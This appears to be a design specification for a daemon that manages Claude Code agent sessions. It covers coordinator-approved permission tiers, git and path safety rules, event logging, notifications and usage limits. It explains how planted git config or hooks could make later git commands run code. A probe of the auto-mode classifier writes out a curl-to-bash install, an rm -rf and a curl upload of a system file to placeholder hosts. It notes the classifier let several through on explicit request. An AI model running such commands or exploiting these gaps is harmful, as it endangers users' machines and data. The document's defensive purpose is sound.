| `Edit`, `Write`, `NotebookEdit` | the path passes the path check as a write (the authority the user grants with `acceptEdits`; changes show in the git diff), names no git control file, and the cwd is a plain repository (or no repository) |

Always `high`, among others: every other `Bash` command (see below), `ExitPlanMode`, `EnterPlanMode`, `Agent`/`Task` (a subagent inherits nothing from the tier), `WebFetch`, `Skill`, `BashOutput`, `KillShell`, `MultiEdit`, unknown names. `AskUserQuestion` is a Question, never tiered.

Path check (`file_path`, `notebook_path`, `path`): a non-empty string without NUL, no `..` segment (a `~` path is never expanded: its `~` segment is denied below); resolved against the worker cwd, symlinks resolved with `realpath` (a missing tail through its nearest existing ancestor; a dangling symlink fails), and inside the real cwd. The cwd itself is fine for a read (not for Grep), not for a write. Reads also accept paths in the main checkout of a daemon-layout worktree (cwd `<main>/.claude/worktrees/<name>`, `<main>/.git` a directory, the cwd's `.git` file pointing into `<main>/.git/worktrees/`; the `.git` file is not low-writable): the first root (cwd, then main) that holds the real path decides, under the same deny list, so another worker's worktree (`.claude/worktrees`) stays denied. Reads treat agent docs as not denied: `.claude/skills/**` as the first two segments below a root, and `CLAUDE.md` / `AGENTS.md` as the last segment (`.claude/settings*.json`, `.claude/.credentials.json`, a nested `sub/.claude/skills`, `CLAUDE.local.md` stay denied; the aliasing rules still apply to every segment). Writes keep the full list below. Denied at any depth, case-insensitive, on the real path and on the path as written: segments `.git` (hooks, `core.hooksPath`, `core.fsmonitor`), `.claude`, `.vscode`, `.idea`; names `.mcp.json`, `CLAUDE.md`, `CLAUDE.local.md`, `AGENTS.md`, `.envrc`, `.npmrc`, `.env*`, `*.pem`, `*.key`, and the git repo control names `HEAD`, `packed-refs`, `commondir` and `gitdir`; a segment with `:` or `~`, ending in `.` or a space, or holding a Unicode default-ignorable code point (NTFS streams, 8.3 names, trailing-dot aliasing, HFS+ ignorables). A write to an existing file with more than one hard link fails, and so does a write of a `config` next to a `HEAD`, `objects` or `refs` entry, or a write into (or of) an `objects` or `refs` entry next to a `config` (a repo config, in either order). These keep low writes from building a git repo layout whose config a later git command the user approves would run.

Bash is `high` except a read-only git command in a worker whose CLI runs with `CLAUDE_BASH_MAINTAIN_PROJECT_WORKING_DIR=1` (`git-readonly.ts`, GH-163). History (review GH-79 part 3): low Writes of `HEAD`, `objects/x`, `refs/x` and `config` in a cwd without its own `.git` make git discover the cwd as a bare repo whose `config` (`core.fsmonitor`, `diff.external`, attribute filters) runs code on a `git status`, `git diff` or `git add`; the Bash tool keeps its shell cwd after a user-approved `cd`. Both are closed now: the write rules above refuse the bare-repo layout, and the env var makes the CLI return to the project directory after each Bash call (probe, CLI of 2026-10: `cd sub` then `pwd` prints the cwd with it, `sub` without; `development-docs/GH-163/impl-s2-probe-cwd.log`); the daemon sets it for every worker query (a session linked to a coordinator) and judges Bash by it only for such a query. A command is `low` only when all hold, any doubt is `high`: the input holds only `command` (1 to 1000 chars), `description`, `timeout` (so no `run_in_background`, no `dangerouslyDisableSandbox`); the cwd holds its own `.git` (git never walks into a parent repository); the command is only `A-Za-z0-9 ._/@^~:=,+%{}&|;-` (no quotes, `$`, backtick, `\`, `* ? [ ]`, `# ! < > ( )`, tab, newline, non-ASCII: what is parsed is what bash runs); split on `&&`, `||`, `;` into at most 5 non-empty segments, none holding `&` or `|` (no pipe, background, `2>&1`); each segment starts with the word `git` (no path, no `VAR=x`), then only the global options `--no-pager` and `--no-optional-locks`, then one of: `status`, `log`, `show`, `diff` (options by exact name from the tables in `git-readonly.ts`: git's abbreviations never reach `--output`, `--ext-diff`, `--textconv`, `--no-index`, `--show-signature`, `-O`, `--stdin`; `--format` / `--pretty` without `%G`; numbers and enumerated values only), `branch --show-current`, or `rev-parse` with only `HEAD`, `--abbrev-ref`, `--short`, `--show-toplevel`, `--is-inside-work-tree`. Positionals (revisions and pathspecs, and everything after `--`): a revision containing `stash` or `refs/` is refused (refs are shared by every worktree and `stash -u` keeps untracked files, `.env` included, in the stash's `^3` tree), and `--all` is not an option; no leading `~`, `:`, `/` or drive letter; `~` only after a name character; `{}` only as `@{name}`; no `..` segment (ranges `a..b` are fine); no denied name in the path part (`git show HEAD:.env`, `git diff .env` are high; `HEAD:CLAUDE.md` is low); a token that exists on disk must pass the read path check (symlinks out of the cwd, `git diff <path> <path>` as an implicit `--no-index`). Test, build, lint and typecheck commands, `npx` and `git commit` run code the worker can write, so they could never be `low` while Edit inside the cwd is (a departure from the GH-79 issue list). A coordinator hands a blocking Bash request to the user with `worker_escalate`.

Plain repository (`git-readonly.ts` `repoSafety`, GH-163 round 4). Three review rounds each found another file a low Write could plant that a low read-only git command then ran (a submodule's hooks after emptying `.gitmodules`, an `include.path` target, a hooks folder with a new name), so the rule no longer lists what git runs; it asks whether anything a worker can influence decides it. The cwd is **not plain** when any of: (1) at any scope, `core.hooksPath`, `core.fsmonitor` (not a boolean), `diff.external`, `diff.<driver>.textconv` / `command`, `filter.<driver>.clean` / `smudge` / `process`, `gpg.program` or `gpg.<format>.program` is set to anything but one absolute path outside the cwd (`~` expanded; a hooks folder may hold spaces), except, in system or global config only, the exact values Git for Windows and `git lfs install` write (`git-lfs clean -- %f`, `git-lfs smudge -- %f`, `git-lfs filter-process`, `astextplain`); an empty program value names none; (2) an `include.path` or `includeIf.<cond>.path` whose target (`~` expanded, a relative one against the folder of the file that holds it, from `--show-origin`) is inside the cwd or cannot be placed; (3) the worktree holds a `.gitmodules` file or a nested `.git` entry at any depth (`node_modules` is not walked: git never enters a repository there unless it is a gitlink, and a low Write cannot create `.git` or `.gitmodules`), or more than 50,000 entries; (4) its index holds a gitlink (`git ls-files --format=%(objectmode)`, mode 160000: a submodule, whatever `.gitmodules` says); (5) `PATH` has an empty or relative entry; (6) any of this fails or times out (5 s per git process): fail closed. Not plain: `git status`, `log`, `diff`, `show` are `high` (`rev-parse` and `branch --show-current` stay `low`), and so is every Edit, Write and NotebookEdit in the cwd. Always `high` to write, plain or not, any case, at any depth: a segment named `hooks`, starting with `.husky` or `.git` (`.gitmodules`, `.gitattributes`, `.gitconfig`, `.gitignore`, `.githooks*`; not `.github` or `.gitlab*`, CI files a push runs), `.lfsconfig`, and a path a config value names inside the cwd (a program's or include's path-like words, and keys ending in `file` or `template`: `core.attributesFile`, `core.excludesFile`, `commit.template`). A worker therefore cannot change what git reads to decide what runs, and a change the user approved (a `.gitmodules`, a nested repository, a `git submodule add`) makes the repository not plain from the next request on. The facts (`git config --list -z --show-scope --show-origin`, `git ls-files` and a walk; they run nothing: `ls-files` only after the config is plain) are read off the event loop (`repoSafetyAsync`, `tierAsync`): git runs in one worker thread (eval'd plain JS; even an async spawn creates the process on the main thread, which on Windows under load held the loop for hundreds of ms), the walk with async `readdir`; any failure, a git process past 5 s, a call queued past 20 s or a walk past 5 s is a failed (unsafe) read. The thread recovers: one that errors is marked broken and logged, and async child processes (`execFile`) take over; one that exits is started again on the next read; a call that times out in the queue terminates it and the next read starts a new one. A scan in flight for the same cwd is shared only when it started less than 1 s ago and after the session's last change; nothing is kept after it completes. Per request (`Session.permissionTier`) one read is kept for the permission event and `worker_permission`'s pre-check (the information the coordinator sees), read again when the worker's session changed (the session's epoch: an allowed request, any answerer, or a tool call or bash command that ended). That kept read never decides a settle: the settle-time check reads afresh (below). Cost: two git processes per read, off the loop (stall probe `development-docs/GH-163/r5-stall-probe.mts`, numbers in `notes.md`). Reads are not affected (main-checkout reads stay `low` under the deny list).

Settle (`Session.coordinatorRespond(id, answer)`, the one coordinator settle path, async; the tier is read afresh there, at settle time, sharing no scan that started before the settle, so a change from outside the worker's session (a terminal, another session in the same folder, global git config) counts; if the epoch moved while that read ran (an allow or a tool end landed meanwhile) it is read again, at most 5 times, then refused). Atomic per request and serial per worker: a worker's coordinator settles run one at a time; after the tier is read the request is looked up again and settled in the same synchronous step, so a user answer that came first wins and nothing settles twice. Invariant: the worker's CLI is blocked on the request while it is decided, so the worker writes nothing meanwhile; another request of the same worker (parallel tool use) is decided only after this one settled, and an allow moves the epoch so its tier is read again. A file change by an earlier allowed tool that lands after the read (the CLI runs the tool after the allow) is the TOCTOU limit below. `Session.respond` (the user's path) takes no coordinator answer. `coordinatorRespond` is refused (false, nothing settles) for `allow_always`, an `updatedInput` or `ruleIndex`, no reason, an escalated request or a tier other than `low`. Allow: `{behavior: "allow", updatedInput: <original input>}`, no `updatedPermissions` (no Permission rule is written, `.claude/settings.local.json` stays), no `decisionClassification`. Deny: `{behavior: "deny", message: "The coordinator session denied this tool use; it was not run. Its reason:\n<reason>"}`, no `interrupt`, never worded as the user. The settled part gets `by: "coordinator"` and `message: <reason>`; the worker's tool card gets `coordinator: {decision, reason}` and its header says "Approved by coordinator" / "Denied by coordinator", the body shows the reason as plain text (no markdown). The user keeps a veto: the request is pending for the user too, Needs input and push go out as for any request, and the first answer wins. A client message cannot set `by` (`permission.respond` never passes it). Coordinator text is never forwarded as `classifierContext` or as user intent.

Accepted limits (`ponytail:` in `risk-tier.ts` where they live): a main-checkout read exposes its untracked and ignored files under the deny list (scratch `development-docs/`, `node_modules/`); the daemon config files `token`, `vapid.json` and `push-subscriptions.json` are denied by name at any depth, and a Read/LS/Glob/Grep of a folder that holds (below it, at most 3000 entries) a denied name, or more entries than that, is high (WebSearch is low, so a read secret could be carried out); read-only git runs the repository's own configured programs and hooks on `status`, `diff`, `log`, `show`: only in a plain repository (above), where none of them is something a worker can write; the guard is the Write rule as much as the git command, since the Claude CLI itself auto-allows plain read-only git and a planted hook would run on the user's own `git status` without a request. Not covered by "plain": `core.pager` / `pager.<cmd>` (git pages only on a terminal; the Bash tool has none), git-lfs reading `.lfsconfig` (high to write; git-lfs honours only a safe key subset from it), a `.gitattributes` change the user approved routing files to an allowed driver (`astextplain`, git-lfs), and a change the user approved landing between a tier decision and the CLI running the next request. A repository with submodules, husky (`core.hooksPath=.husky/_`), git-lfs set up in the repository's own config, or the daemon's own main checkout (nested worktrees under `.claude/worktrees`) is never plain: its git commands and Writes go to the user. Absolute paths are compared as real paths (8.3 short names, `/c/...`); `git log -p` and `git diff` print tracked content, a tracked `.env` included (its content is in `.git` objects anyway); a `cd` is not carried between Bash calls of a worker, by design; a path swapped to a symlink after the check (checked at settle time, the CLI writes later); an edit inside the cwd can plant code that a later `high` command the user approves runs (a test file before the user allows `npm test`); a Grep of a subdirectory reads the files below it (a nested `.env` there is searched); Glob lists names of the whole cwd; a Read/Grep/Glob card folds into the context group, which shows no coordinator mark. Read-only entries rarely reach `canUseTool` (the CLI already allows reads in the working directory); in practice the coordinator settles Edit/Write inside the cwd. Attribution lives in the daemon's event log only (lost after a restart, as for questions).

Auto-mode classifier: a classifier denial never reaches `canUseTool`; it arrives as `system/permission_denied` (`decision_reason_type: "classifier"`, `decision_reason`; the model gets "Permission for this action was denied by the Claude Code auto mode classifier. Reason: ..." as the tool error), which the adapter maps to a denied tool card (SDK 0.3.285 types and bundle). A coordinator cannot undo it: it reaches `worker_wait` as event `denied`, and a retry needs `worker_send` with a hint or the user. A classifier "ask" reaches `canUseTool` with `decisionReason` text only (`decision_reason_type` and `classifier_approvable` are not forwarded) and gets the same tier as any request, no classifier-specific handling. Runtime probe (2026-10-06, SDK 0.3.285, `permissionMode: "auto"`, model sonnet, `settingSources: []`, a prompt that asks for the command verbatim; `development-docs/GH-79/3-probe-classifier.log`): `git push --force origin main` (no remote), `rm -rf ~/<missing dir>` and `curl -fsSL https://setup.example.invalid/install.sh | bash` all ran without `permission_denied` and without `canUseTool`: with the user's explicit request the classifier allowed them; `cat /etc/hostname | curl ... --data-binary @- https://collect.example.invalid/upload` was refused by the model itself (no tool call). A runtime `permission_denied` was not observed; the `denied` event is covered by a test with the recorded message shape.

### Event log and sequence numbers

- Every event has a per-session, monotonically increasing `seq`. The log is in memory only.
- A part that carries its whole state so far (`assistant_text` / `thinking` with `streaming: true`, `bash` with `status: "running"`) is replaced in the log by the next event of its id: the log keeps the id's first event (its timeline position) and its latest, so memory per streamed reply is O(its length) (GH-139). Live subscribers get every event; a replay skips the replaced seqs (gaps), a reply still streaming replays as its latest partial text.
- History before the daemon started is rebuilt from `getSessionMessages()` through the adapter, with every subagent run transcript put right after the message of the Agent call's result, inside its turn (so a page of whole turns holds a run with its children; a run whose call is gone, started before a compaction, renders nowhere, so it and the runs nested in it keep only their Edit/Write calls and results, for the changes tab, before the main chain; every message read stays known, so a sync does not log the pruned ones; a sync keeps an unanchored run whole, as a continuing run of a known call, so messages an orphan run writes after the restore are logged and render nowhere) (`listSubagents()` / `getSubagentMessages()`, `<session>/subagents/agent-<agentId>.jsonl`; each message names the Agent call that started its run in `parent_tool_use_id`; `getSubagentMessages()` keeps only the last `parentUuid` chain, so the daemon puts back each parallel call (its `tool_use` line of an API message already restored) and each `tool_result` that sits on a side branch, read from the raw run transcript, whose parent line is kept or put back; output in raw file order, the API order), so restored and terminal CLI sessions have full subagent timelines. A run's prompt is no checkpoint. The live query resumes on the same adapter, so a later task notification finds a restored run. A run or call still running at the end of the restore (no `<task-notification>` or `tool_result`: its CLI exited mid-run) ends `stopped`, a run at its last transcript message: no query runs it. A conversation rewind closes the query: a background run still running then ends `stopped` too.
- Each daemon start has a `logEpoch`. `session.subscribe {sessionId, sinceSeq, logEpoch}`: same epoch → replay after `sinceSeq`; different epoch → client clears its store and gets a full replay. The reply carries the current `SessionInfo` and its `seq`: replayed model/mode/effort changes up to that `seq` are older and do not override it. It also carries the session's `title` as `session.list` gives it: a tab opened before the list arrives, or for a session the list omits (page-load hash session of a removed project), shows it instead of "Untitled". A session a /clear handed the query to, before its first prompt, is titled "New session" without reading its transcript (also in `session.list`). `session.subscribe {…, background: true}` follows only (unread markers): it is not a hold and does not keep the CLI from the idle close; a plain subscribe holds until the connection unsubscribes (`session.unsubscribe {sessionId}`, reply `{}`, never restores a session), resubscribes or closes. A resubscribe replaces the earlier subscription of the connection (hold to background and back).
- Paged subscribe (`session.subscribe {paged: true, from?}`): the daemon keeps a materialized index of each session's timeline parts (the same fold as the client store: upsert by id, `rewind` cuts, `retract` removes) next to the log. A paged subscribe with `sinceSeq` 0 or a new epoch gets a snapshot instead of the replay: the reply's `snapshot` = `{heads, attentionSeq, page, aux}` and no event is replayed (the daemon subscribes at the reply's `seq` in the same step). `page` = the last page, whole turns (a turn starts at a top-level `user_text`), newest first until it holds `PAGE_TURNS` (10) turns or `PAGE_PARTS` (400) parts (one turn at least, a giant turn goes whole). `heads` = the latest `session_state`, `commands`, `context_usage`, `external_turn`, `auto_continue` and `todo_update` events; `attentionSeq` = the unread marker computed with the client's rule; `aux` = parts of the not loaded region that whole-session features need (every `subagent` and `turn_result`, running background Bash calls). `page.older` = the cursor `{before, pos}` (id of the oldest loaded turn start, and its first seq in this daemon run); absent = the session start is loaded. `session.page {sessionId, logEpoch, before, until?}` returns the page before a cursor (`until`: a part id or API message id; the page then reaches back to the turn holding it); `session.edits {sessionId, logEpoch, before}` returns the Edit/Write calls and results before the cursor, for the changes tab. Errors: `stale_epoch` (the daemon restarted), `unknown_cursor` (rewound away; the client takes a fresh snapshot). After a daemon restart the client resubscribes with `from` = its oldest loaded turn start (transcript uuids are stable), so the snapshot starts at that turn (up to 3000 parts, else the last page). An event that updates an existing part carries `pos` (that part's first seq); a client ignores updates (`pos` below its cursor) of parts it has not loaded, except `aux` entries. Not paged (older clients, side daemons, the orchestration observer): the full replay as before. The restore itself is still a whole transcript read: the SDK's `getSessionMessages` `offset` counts from the start and parses the whole file, and the adapter needs the whole history (tool status, subagent runs, compaction).
- Clients drop events with `seq` ≤ the last applied one.
- State changes, permission requests, questions and their settlement are all logged events, so replay alone restores the full view.

### Permission bridge (same behavior as Claude Code)

1. The SDK calls `canUseTool(tool, input, {suggestions})`. Rules already saved (Claude Code rules in `.claude/settings*.json`) never reach the callback.
2. The daemon logs a `permission_request` part with the SDK's suggested rules and sets state `needs_input`.
3. Options shown (OpenCode dock): **Allow once** / **Allow always** (only with SDK suggestions; the dock lists the rule patterns) / **Deny**, with a feedback field that tells Claude what to do differently. Rules are chosen by the SDK, not the user. Bash rules are saved to `.claude/settings.local.json` (via `updatedPermissions`), Edit rules last for the session, as in Claude Code.
4. Edit/Write requests show a diff; "Edit content" swaps the diff for the editable proposed content ("Show diff" swaps back, keeping the edit), and the changed content is sent on accept (`updatedInput`). Only one view shows at a time.
5. The first answer settles the request; a settlement event tells every client. Later answers are ignored. A request settled by a coordinator ("Permission tiers") shows on the tool card: "Approved by coordinator" / "Denied by coordinator" and its reason. An escalated request's panel shows "Escalated by coordinator: <reason>" (plain text), as the question panel.
6. No timeout: a request waits until someone answers.
7. Interrupt denies pending requests.
8. The panel header has a Stop button (like Esc: it denies the request and interrupts the turn): the panel replaces the prompt box, so without it a phone could not stop the turn.
9. The panel is at most 60% of the viewport height (`60dvh`, like the question panel): its body scrolls and the Allow/Deny tray stays in view, which matters on a phone.

### Questions

`AskUserQuestion` arrives through `canUseTool`. The daemon logs a `question` part; the UI shows a question panel in place of the prompt box, with an "Other" free-text choice. The answer returns through `updatedInput`. Counts as `needs_input`. `by: "coordinator"` / `escalated` + `reason` (Orchestration): the timeline marker says "Answered by coordinator", the panel shows "Escalated by coordinator: <reason>" (plain text).

### Steering and interrupt

- A message sent while a turn runs is pushed into the query immediately (steering); Claude Code injects it after the current tool calls. The SDK does the same (verified, see "Open items"). Its `isReplay` echo marks when the CLI took it; a message taken after the turn ended runs as its own turn, so the echo sets `running` again.
- `session.stopSubagent`: `stopTask()` with the `task_id` of the run's `system/task_started` (matched by `tool_use_id`, for a run `SendMessage` resumed by its Agent call; dropped at its `task_notification`); the CLI then sends `task_notification` `stopped` and the Agent call's error result.
- `session.interrupt` denies pending requests (like No without feedback), then calls `interrupt()`; a no-op while `idle`. Stop is the round button in the prompt box (and Esc); while text is typed to steer, a separate Stop sits beside Steer; a permission request, which replaces the prompt box, has a Stop button in its header. The session header has no Stop. The CLI then sends the user text `[Request interrupted by user]` (or `... for tool use]`), logged as `turn_interrupted`, and a `result` with `terminal_reason` `aborted_streaming` / `aborted_tools`, which logs no `turn_result` and returns the session to `idle`. The query stays live.
- `session.interrupt` also kills a running bash mode command (its process group: SIGTERM, SIGKILL after 2 s; the card shows "Stopped"; its records are still appended).

### Commands, skills, models

- Commands and skills come from `supportedCommands()` and are refreshed on `system/commands_changed`. The daemon logs them as a `commands` part (fixed id, replaced on each change), so every tab gets the push and replay restores it; there is no `commands.list` request. Terminal-only commands (`terminal_slash_commands`) are hidden. That list arrives only with `system/init`, after the first prompt; until then a built-in fallback set is hidden. Rows sharing a name collapse to the builtin one.
- A restored session has no query before its first prompt: when a tab first subscribes to it, the daemon loads its commands once through a throwaway query (`persistSession: false`, no hooks, the daemon-wide throwaway queue; the daemon's own push observer does not count), so the picker is filled before the first prompt. A live query's `supportedCommands()` / `commands_changed` still replaces the list. The new-session tab has no session: it sends `session.commands {cwd}` (reply `{ commands }`; error `commands_failed`) when it shows and when its project changes. The daemon caches the list per cwd for 60 s. Until a list arrives only the web dialog commands are listed.
- The picker opens for a `/word` at the caret that starts a line or follows whitespace, anywhere in the prompt (like `@`). Picking a row, by Enter, Tab or click, replaces only that token with `/name ` and sends nothing, except when the token is the whole prompt (Enter on a full name sends, as before). Dialog commands are listed only in that whole-prompt case.
- Invoked by sending `/name args` as prompt text.
- Models from `supportedModels()`; switch with `setModel()` mid-session.
- Permission modes (SDK `PermissionMode`): `default`, `acceptEdits`, `plan`, `auto`, `dontAsk`, `bypassPermissions`. `SessionInfo.permissionModes` lists those a session can switch to: `auto` only when the session's model has `supportsAutoMode` (the daemon reads the cached `supportedModels()` list), bypass only when enabled. When `setModel()` gives a session in `auto` a model without auto support, the daemon sets mode `default` (`session_permission_mode` part); a saved `auto` on such a model restores as `default`. `session.list` waits at most 2 s for the model list; without it, new sessions are offered no `auto`. `dontAsk` denies every tool call not allowed by a rule: the CLI sends `permission_denied`, shown as a denied tool card, and no `permission_request` exists, so no needs-input push. `auto` escalations arrive as normal permission requests.
- Default permission mode: a new session starts in `permissions.defaultMode` of the Claude settings, resolved for its cwd like Claude Code (`.claude/settings.local.json` > `.claude/settings.json` > `settings.json` of `$CLAUDE_CONFIG_DIR` or `~/.claude`; the highest file that sets a valid value wins, an unknown value is skipped, and `auto` / `bypassPermissions` count only from the user file, as in Claude Code). The files are read on each `session.create` and `session.defaultMode`, so an edit applies to the next new session without a restart. Unset, unreadable, unknown, or not offered (`auto` for a model without `supportsAutoMode`, `bypassPermissions` without `CLAUDE_UI_ALLOW_BYPASS`) gives `default`. The new-session tab asks `session.defaultMode` for its project each time it is shown and preselects the mode until the user picks one (`default` when the draft's model does not offer it); a restored session keeps its saved mode. Session-scoped grants (`destination: "session"`) are re-applied at each query start (see "Idle close").
- Permission mode and effort: start options of the query; while it runs `setPermissionMode()` / `applyFlagSettings({effortLevel})`, applied from the next turn. The CLI changes the mode itself too (plan approved, "all edits this session"); `system/init` and `system/status` carry it, and the daemon logs every change as a `session_permission_mode` part. Effort changes log `session_effort`. The daemon saves each session's model, mode and effort in `sessions.json` in its config dir (written to a temp file, then renamed; at most 1000 entries, least recently changed dropped first; `session.delete` removes the entry; a list removes the entry of a session with no transcript that is not live on this daemon, unless the entry changed in the last 24 hours: it may belong to a new session live on another daemon, whose transcript appears with its first prompt). Daemons of one user (other ports) share the file like `projects.json` (see "Projects"): each re-reads it before every read and change and saves only the field the user set (model, mode or effort; all of them for a session without an entry), so a change on one daemon (another session, or another field of the same session) is not lost by another, and a saved mode this daemon does not enable stays in the file; a failed write keeps the change in memory for the run, an unreadable or corrupt file keeps the settings in memory (corrupt at start: empty), logged once. Known limits: a live session does not see a setting another daemon changed, and its picker sends no request when the user picks the value it shows, so that pick does not replace the other daemon's saved value; no lock, so two writes in the same millisecond can lose one change; a session restored after a restart shows and resumes with them (a mode not enabled now falls back to `default`). Without an entry, mode and effort come from the raw transcript: `permissionMode` of the last prompt, `effort` of the last main-thread reply (the effort it ran with, e.g. `medium` for the model's default). So a session's settings are saved when its first query starts, defaults too: a web session keeps "Default" after a restart.
- Context usage: `getContextUsage({detail: "summary"})` (no token-count requests) after each `result`, each `system/compact_boundary`, each model switch and each conversation rewind (a throwaway resumed at the fork point), logged as a `context_usage` part (fixed id). A restored session asks a throwaway query resumed on its transcript without a prompt and with `persistSession: false` (the transcript file, mtime included, stays unchanged), closed after the answer. Throwaway queries run one at a time daemon-wide; a queued one is dropped when the session starts its real query first. A throwaway runs with `settings: {disableAllHooks: true}` (viewing a session fires no SessionStart hook) and is closed after 30 s without an answer (failure logged, meter keeps its last value).
- Plan usage (Claude Code `/usage`): `usage_EXPERIMENTAL_MAY_CHANGE_DO_NOT_RELY_ON_THIS_API_YET({skipBehaviors: true})`, called only in `plan-usage.ts`, on the session's query after each `result` and each `rate_limit_event` (its `status` shows at once: `allowed_warning` near a limit, `rejected` = limit hit; it ends at its reset time, one without a reset time on the next read). At the earliest reset time (status or window) the daemon reads again, also while idle (a reset beyond the 24.8-day timer limit waits in clamped steps). A `rejected` status names its window from `rateLimitType` (`statusLimit`). Windows are the server's usage rows (kind, percent, reset time, severity). A connection gets the last value; a read older than 5 min is refreshed by a throwaway query in the same one-at-a-time queue as the context usage ones (one pending read shared by a connect burst). Percent rounded. `rate_limits_available` false (API key, Bedrock, Vertex): `usage` null, meter hidden. `rate_limits` null while available (fetch failed): last value kept. Titlebar meter: headline window ring + percent (in a warning or limit state the worst window, named in the label; Settings > Usage limits > "Usage ring shows", per browser, `localStorage["claude-ui.usageRing"]`: Highest usage (default, that headline), Session (5 h) or Weekly picks the window of kind `session` or `weekly_all` for the ring and percent, falling back to the headline when it is missing; the level, color and warning icon always follow the worst window, and the popover lists every window); warning icon at 80% or a non-normal server severity, limit at 100% or `rejected`; click lists every window with percent and reset time.

### Continue after a usage limit

With `usageLimit.autoContinue` on (Settings; default off), the daemon sends the prompt `continue` to a session its plan usage limit stopped, once the limit resets. The daemon acts, not the browser: it needs no open tab.
- A session counts as stopped by the limit when its turn ended with a main-chain assistant message with `error` `rate_limit` (the CLI's own "You've hit your limit · resets ..." message). The reset time is the `resetsAt` of the turn's `rejected` `rate_limit_event`, else the plan usage's `statusResetsAt`; none in the future: nothing is scheduled (logged). A rejected event alone is not enough (with extra usage on, the request is served). An interrupted or idle session is never scheduled.
- The prompt goes out at reset + 10 s as a normal user prompt (`continue` in the transcript, a normal turn, the session's current permission mode). The session logs `auto_continue {at}` (ms) from the stop until then (`at` null afterwards); the web app shows "Continuing at 14:05 after the usage limit resets" with Cancel above the prompt box (44 px target below `md`), and the session header is unchanged.
- Several sessions stopped by the same limit continue one after another in stop order, 5 s apart.
- Cancelled by: the user's own `session.prompt` or `session.bash`, a coordinator's `worker_send`, `session.cancelContinue` (Cancel), `session.delete`, the setting turned off (every schedule, and again at fire time). At fire time a session that is gone, not live or not `idle` is dropped (logged), not retried.
- The turn after `continue` may hit the limit again (the server had not rolled over): with the same reset time the next try is at the later of reset + 10 s and 60 s from now, at most 3 tries (counted when a continue is sent); a new reset time starts over. The CLI sends the rejected event once per reset time, so a repeat hit without one reuses the reset time of the continue sent in the last 10 minutes. The plan usage fallback for a missing reset time applies only while its status is `rejected` (another 429 during a warning is no usage limit). A `session.rewind` also cancels the schedule, and a message the user sends while the continue waits on its sync wins: no second prompt.
- Limit of v1: a turn run by a terminal CLI of the same session is not detected (the daemon sees only its own query's turns), so no continue follows it.
- Schedules live in memory: a daemon restart drops them (the setting's hint says so; a restored session shows no indicator). A side daemon acts on its own `settings.json`.
- `ExitPlanMode` arrives through `canUseTool` without suggestions; the daemon adds `setMode acceptEdits` so the panel offers Claude Code's "Yes, and auto-accept edits" next to "Yes, manually approve edits" and "No, keep planning". Each "Yes" sends its mode as `setMode` (auto-accept → `acceptEdits`, manually approve → `default`); without it the CLI restores the mode active before plan mode.

### Push notifications (same rules as Orca, MIT: behaviour only, no code)

- Web Push with VAPID keys generated by the daemon; payload end-to-end encrypted, full text (session title + tool/command, or last line of the answer; ~4 KB max).
- Events: `needs input` and `finished` (an error counts as finished).
- `finished` waits 1.5 s and is cancelled if work resumes; none while background tasks still run (`idle` with `working`): the CLI's turn after the last task notification sends it. At most one push per session per 5 s.
- Suppressed when a focused, visible tab shows that session, or lists it in `covered` (reported by `push.focus`: one event, one channel; the in-app card is that channel while the page is in front with in-app notifications on). Both the Web Push and the desktop fallback go quiet, since the desktop fallback is `send`'s no-subscription branch. Per connection: an empty `push.focus` or a closed socket lifts it. The silent "No longer needs input" replacement stays ungated. A side sees the hub's one link, so with two browser tabs the last `push.focus` wins there (as for `sessionId`). A suppressed or throttled push is dropped, not deferred.
- VAPID keys (`vapid.json`) and subscriptions (`push-subscriptions.json`) live in the daemon config dir next to the token, owner-only. A subscription the push service answers 404/410 for (toggle off, expired) is dropped.
- An escalated worker request (Orchestration) pushes at once, past the 5 s gap, once per request.
- When an escalated request settles (answered by the user, stopped, cancelled), its notification is replaced by a silent one with the same tag (`No longer needs input · …`; `PushPayload` `silent`, `replace`, `tag`; Web Push must show every push, so it cannot only be closed). Not gated by the 5 s gap or a focused tab. The desktop fallback shows nothing for a replacement. Only an escalation push that went out is replaced.
- Workers of one coordinator blocked on the same request (same tool and input text, e.g. several Reads of one playbook) share one notification: its tag is `req-<hash of coordinator + request>`, its title the coordinator's. The first push says what it says today; each further worker replaces it silently with `N workers need input · <request, a path cut to its last two segments>` (`PushPayload` `replace`, `silent`: the desktop fallback shows only the first); when a worker's request settles or it leaves Needs input the count drops, and the last one replaces it with `No longer needs input`. Sessions that are not workers keep one notification per session.
- Click opens the session and scrolls to the bottom.
- The browser's on/off switch is Settings › Notifications › Push notifications (per browser); the desktop fallback has its own switch there (below).
- Unread: a session is unread after it needs input or finishes (same rule: not while background tasks run) until a focused, visible tab shows it. The tab follows every live session in the list for this (`background: true`: no hold); the closed tab of a live session stays followed this way.
- Needs HTTPS (see Security) and, on iOS, 16.4+ with the app added to the Home Screen.
- Desktop fallback: while no subscription is stored, `send` shows the same title and body as an OS notification on the daemon's machine (same rules: the notifier calls `send`): Linux `notify-send --app-name=claude-ui -- <title> <body>`, macOS `osascript` (`display notification`, text as `on run argv` arguments), Windows `powershell.exe -EncodedCommand` (WinRT toast with PowerShell's AppUserModelID; XML-escaped text, base64 in the script). Argv only, never a shell or script string with session text. Title ≤100, body ≤500 chars. No click action. A failing command is logged once (error code only); a missing command (ENOENT) is not called again. A side's pushes reach the hub, which shows the toast. Off: `--no-os-notify` / `CLAUDE_UI_OS_NOTIFY=0` (always, the setting cannot turn it on) or the setting `notifications.desktop` (read at send time, per daemon, shared by its browsers).

### Platforms

- Linux, macOS (untested) and Windows (native Node 22+, PowerShell). A daemon sees only the Claude Code install of the OS it runs in (its `~/.claude`: login, transcripts, settings, MCP, plugins); on Windows with WSL it reaches each distro's install through a side, and on any OS with Docker each running Linux container's (below).
- Daemon config dir (token, VAPID keys, `sessions.json`, `projects.json`): `$XDG_CONFIG_HOME/claude-ui`, else `~/.config/claude-ui`; on Windows without `XDG_CONFIG_HOME` `%APPDATA%\claude-ui`, unless a `~/.config/claude-ui` of an earlier run exists (kept, so its pairing stays).
- Windows paths: the daemon canonicalizes with the native realpath (on-disk case), and a listed or restored session takes its transcript cwd in that form; the Windows CLI writes the cwd as its caller typed it (VS Code: `c:\Users\…`), and NTFS finds the transcript folder in either case. Roots compare without case (`path.relative`). The web app treats a path with a drive letter or UNC prefix as Windows: `\` and `/` separate, compare without case; fs.search answers `/`-separated relative paths, joined to the cwd with `\`; an editor mention is `/`-separated.
